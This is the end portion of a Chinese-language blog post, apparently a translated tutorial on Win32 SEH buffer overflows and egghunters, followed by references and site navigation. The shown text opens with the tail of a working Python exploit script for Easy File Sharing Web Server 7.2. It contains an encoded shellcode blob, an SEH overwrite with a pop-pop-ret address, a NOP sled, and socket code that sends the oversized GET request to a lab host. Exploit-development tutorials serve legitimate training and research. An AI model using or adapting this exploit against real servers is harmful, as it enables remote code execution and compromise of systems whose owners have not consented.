class="line">&quot;\xf5\x53\x9d\xd3\x91\xe4\xee\xe1\x3e\x5f\x79\x4a\xb7\x79\x7e&quot;</span><br><span class="line">&quot;\xdb\xdf\x79\x50\x63\x8f\x87\x51\x94\x86\x43\x05\xc4\xb0\x62&quot;</span><br><span class="line">&quot;\x26\x8f\x40\x8a\xf3\x3a\x4a\x1c\x50\xaa\x40\x77\xc0\xc9\x54&quot;</span><br><span class="line">&quot;\x86\xaa\x47\xb2\xd8\x9c\x07\x6a\x99\x4c\xe8\xda\x71\x87\xe7&quot;</span><br><span class="line">&quot;\x05\x61\xa8\x2d\x2e\x08\x47\x98\x07\xa5\xfe\x81\xd3\x54\xfe&quot;</span><br><span class="line">&quot;\x1f\x9e\x57\x74\xaa\x5f\x19\x7d\xdf\x73\x4e\x1a\x1f\x8b\x8f&quot;</span><br><span class="line">&quot;\x8f\x1f\xe1\x8b\x19\x77\x9d\x91\x7c\xbf\x02\x69\xab\xc3\x44&quot;</span><br><span class="line">&quot;\x95\x2a\xf2\x3f\xa0\xb8\xba\x57\xcd\x2c\x3b\xa7\x9b\x26\x3b&quot;</span><br><span class="line">&quot;\xcf\x7b\x13\x68\xea\x83\x8e\x1c\xa7\x11\x31\x75\x14\xb1\x59&quot;</span><br><span class="line">&quot;\x7b\x43\xf5\xc5\x84\xa6\x85\x02\x7a\x35\xa2\xaa\x13\xc5\xf2&quot;</span><br><span class="line">&quot;\x4a\xe4\xaf\xf2\x1a\x8c\x24\xdc\x95\x7c\xc5\xf7\xfd\x14\x4c&quot;</span><br><span class="line">&quot;\x96\x4c\x84\x51\xb3\x11\x18\x52\x30\x8a\xab\x29\x39\x2d\x4c&quot;</span><br><span class="line">&quot;\xce\x53\x4a\x4c\xcf\x5b\x6c\x70\x06\x62\x1a\xb7\x9b\xd1\x05&quot;</span><br><span class="line">&quot;\x2a\x31\x2c\xae\xf3\xd0\x8d\xb3\x03\x0f\xd1\xcd\x87\xa5\xaa&quot;</span><br><span class="line">&quot;\x29\x97\xcc\xaf\x76\x1f\x3d\xc2\xe7\xca\x41\x71\x07\xdf&quot;)</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">buffer += shellcodenops</span><br><span class="line">buffer += shellcode</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure>

<p>与<strong>VulnServer</strong>相似-我还在Visio中创建了一个漂亮的小图，以演示该漏洞利用过程并从较高的角度进行跳转。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162630.png" class="lozad"></p>
<h1 id="0x03-参考资料-资源"><a href="#0x03-参考资料-资源" class="headerlink" title="0x03 参考资料/资源"></a>0x03 参考资料/资源</h1><p>特别鸣谢以下所有民众：</p>
<p><a href="https://h0mbre.github.io/" target="_blank" rel="noopener">https://h0mbre.github.io</a></p>
<p><a href="https://www.securitysift.com/" target="_blank" rel="noopener">https://www.securitysift.com</a></p>
<p><a href="https://captmeelo.com/" target="_blank" rel="noopener">https://captmeelo.com</a></p>
<p><a href="https://www.fuzzysecurity.com/" target="_blank" rel="noopener">https://www.fuzzysecurity.com</a></p>
<p><a href="https://securitychops.com/" target="_blank" rel="noopener">https://securitychops.com</a></p>
<p><a href="https://nutcrackerssecurity.github.io/Windows4.html" target="_blank" rel="noopener">https://nutcrackerssecurity.github.io/Windows4.html</a></p>
<hr></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">madcoding</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mad-coding.cn/2019/10/11/Win32缓冲区溢出-SEH溢出和Egghunters/">https://www.mad-coding.cn/2019/10/11/Win32缓冲区溢出-SEH溢出和Egghunters/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mad-coding.cn">madcoding’s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/翻译/">翻译    </a></div><div class="post_share"><div class="social-share" data-image="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028162833.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-buttom"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/wechat.jpg"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/alipay.jpg"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull-left"><a href="/2019/10/11/Linux Notes/"><img class="prev_cover lozad" data-src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=2083938188,947746588&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>Linux Notes</span></div></a></div><div class="next-post pull-right"><a href="/2019/10/11/我的漏洞库/"><img class="next_cover lozad" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163005.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>我的漏洞库（不断跟新中）</span></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;

window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'G4KVNWBtXJxgbEwcA9QMJGVo-gzGzoHsz',
  appKey:'E8XbTUIA04PSPKW9rGpkjYg3',
  placeholder:'Please leave your footprints',
  avatar:'monsterid',
  guest_info:guest_info,
  pageSize:'10',
  lang:'en',
  recordIP: true
});</script></div></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 By madcoding</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi，welcome to madcoding's <a href="https://www.mad-coding.cn/">blog</a></div><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action"><span>皖ICP备17023740号</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><section class="rightside" id="rightside"><i class="fa fa-book" id="readmode" title="阅读模式"> </i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="fa fa-moon-o nightshift" id="nightshift" title="夜间模式"></i></section><div id="post_bottom"><div id="post_bottom_items"><a id="to_comment" href="#post-comment"><i class="scroll_to_comment fa fa-comments"></i></a><i class="fa fa-list" id="mobile_toc"></i><div id="toc_mobile"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x00-前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">0x00 前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x01-介绍"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">0x01 介绍</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#1-1-异常处理程序101"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">1.1 异常处理程序101</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-1-什么是例外？"><span class="toc_mobile_items-number">2.1.1.</span> <span class="toc_mobile_items-text">1.1.1 什么是例外？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-2-不同类型的处理程序"><span class="toc_mobile_items-number">2.1.2.</span> <span class="toc_mobile_items-text">1.1.2 不同类型的处理程序</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-3-那么结构化异常处理程序如何工作？"><span class="toc_mobile_items-number">2.1.3.</span> <span class="toc_mobile_items-text">1.1.3 那么结构化异常处理程序如何工作？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-4-漏洞"><span class="toc_mobile_items-number">2.1.4.</span> <span class="toc_mobile_items-text">1.1.4 漏洞</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-1-5-提及POP-POP-RET"><span class="toc_mobile_items-number">2.1.5.</span> <span class="toc_mobile_items-text">1.1.5 提及POP POP RET</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#1-1-5-1-什么是POP-POP-RET？"><span class="toc_mobile_items-number">2.1.5.1.</span> <span class="toc_mobile_items-text">1.1.5.1 什么是POP POP RET？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#1-1-5-2-我们为什么要POP-POP-RET？"><span class="toc_mobile_items-number">2.1.5.2.</span> <span class="toc_mobile_items-text">1.1.5.2 我们为什么要POP POP RET？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#1-1-5-3-查找POP-POP-RET模块和说明"><span class="toc_mobile_items-number">2.1.5.3.</span> <span class="toc_mobile_items-text">1.1.5.3 查找POP POP RET模块和说明</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#1-2-彩蛋猎人101"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">1.2 彩蛋猎人101</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-2-1-什么是彩蛋猎人？"><span class="toc_mobile_items-number">2.2.1.</span> <span class="toc_mobile_items-text">1.2.1 什么是彩蛋猎人？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-2-2-彩蛋者如何工作？"><span class="toc_mobile_items-number">2.2.2.</span> <span class="toc_mobile_items-text">1.2.2 彩蛋者如何工作？</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#1-2-3-一个关于NTDisplayString的词"><span class="toc_mobile_items-number">2.2.3.</span> <span class="toc_mobile_items-text">1.2.3 一个关于NTDisplayString的词</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x02-例子"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x02 例子</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-1-带Egghunter的VulnServer"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">2.1 带Egghunter的VulnServer</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-1-模糊和发现崩溃"><span class="toc_mobile_items-number">3.1.1.</span> <span class="toc_mobile_items-text">2.1.1 模糊和发现崩溃</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-2-寻找偏移"><span class="toc_mobile_items-number">3.1.2.</span> <span class="toc_mobile_items-text">2.1.2 寻找偏移</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-3-寻找坏字符"><span class="toc_mobile_items-number">3.1.3.</span> <span class="toc_mobile_items-text">2.1.3 寻找坏字符</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-4-查找POP-POP-RET指令"><span class="toc_mobile_items-number">3.1.4.</span> <span class="toc_mobile_items-text">2.1.4 查找POP POP RET指令</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-5-生成Egghunter"><span class="toc_mobile_items-number">3.1.5.</span> <span class="toc_mobile_items-text">2.1.5 生成Egghunter</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-6-跳到Egghunter"><span class="toc_mobile_items-number">3.1.6.</span> <span class="toc_mobile_items-text">2.1.6 跳到Egghunter</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-1-7-生成Shellcode和最终利用"><span class="toc_mobile_items-number">3.1.7.</span> <span class="toc_mobile_items-text">2.1.7 生成Shellcode和最终利用</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#2-2-无需Egghunter的轻松文件共享Web服务器7-2"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">2.2 无需Egghunter的轻松文件共享Web服务器7.2</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-2-1-模糊和发现崩溃"><span class="toc_mobile_items-number">3.2.1.</span> <span class="toc_mobile_items-text">2.2.1 模糊和发现崩溃</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-2-2-寻找偏移"><span class="toc_mobile_items-number">3.2.2.</span> <span class="toc_mobile_items-text">2.2.2 寻找偏移</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-2-3-寻找坏字符"><span class="toc_mobile_items-number">3.2.3.</span> <span class="toc_mobile_items-text">2.2.3 寻找坏字符</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-2-4-查找POP-POP-RET指令"><span class="toc_mobile_items-number">3.2.4.</span> <span class="toc_mobile_items-text">2.2.4 查找POP POP RET指令</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-2-5-生成Shellcode"><span class="toc_mobile_items-number">3.2.5.</span> <span class="toc_mobile_items-text">2.2.5 生成Shellcode</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#2-2-6-最终利用"><span class="toc_mobile_items-number">3.2.6.</span> <span class="toc_mobile_items-text">2.2.6 最终利用</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x03-参考资料-资源"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x03 参考资料/资源</span></a></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script async src="/js/search/local-search.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="/js/nightshift.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zindex="-1" data-click="false"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
POWERMODE.shake = true; // turn off shake
document.body.addEventListener('input', POWERMODE);
</script><script src="/js/tw_cn.js"></script><script>translateInitilization()

</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
observer.observe();</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>